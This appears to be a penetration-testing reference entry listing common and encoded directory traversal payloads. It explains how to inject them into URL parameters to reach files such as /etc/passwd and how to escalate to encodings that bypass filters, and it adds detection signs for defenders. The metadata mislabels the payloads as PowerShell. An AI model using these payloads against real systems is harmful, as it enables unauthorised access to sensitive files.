---
id: 41e85c0c-0606-41be-a0e0-35715d999086
name: Common-Directory-Traversal-Payloads
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:55:57.777854+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - directory-traversal
  - payloads
validated: true
---

# Common-Directory-Traversal-Payloads

## Code

```powershell
../
..\
../
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

## Description

This code snippet lists common directory traversal payloads, including literal, mixed-slash, and encoded variants designed to bypass web application filters. These strings can be injected into URL parameters or POST data to navigate outside the web root and access sensitive files.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | These are static strings; no variables, but chain multiple (e.g., repeat '../' 5 times) based on directory depth | '../' for one level up |

## Usage

Use these payloads in requests to vulnerable endpoints, such as appending to a 'file' parameter: http://target.com/?file=../../../etc/passwd. Start with basic '../' and escalate to encoded versions if blocked. Ideal for manual testing with tools like curl or Burp Suite in procedures like [[procedures/Basic-Directory-Traversal-Exploitation]].

## Detection

- Web server logs showing requests with '../', '%2e%2e', or Unicode sequences in path parameters.
- WAF alerts on anomalous path traversal patterns.
- File access logs indicating reads from restricted directories like /etc/ or C:\Windows\.

## Related

- [[procedures/Basic-Directory-Traversal-Exploitation]]
- [[curl-directory-traversal-test]]
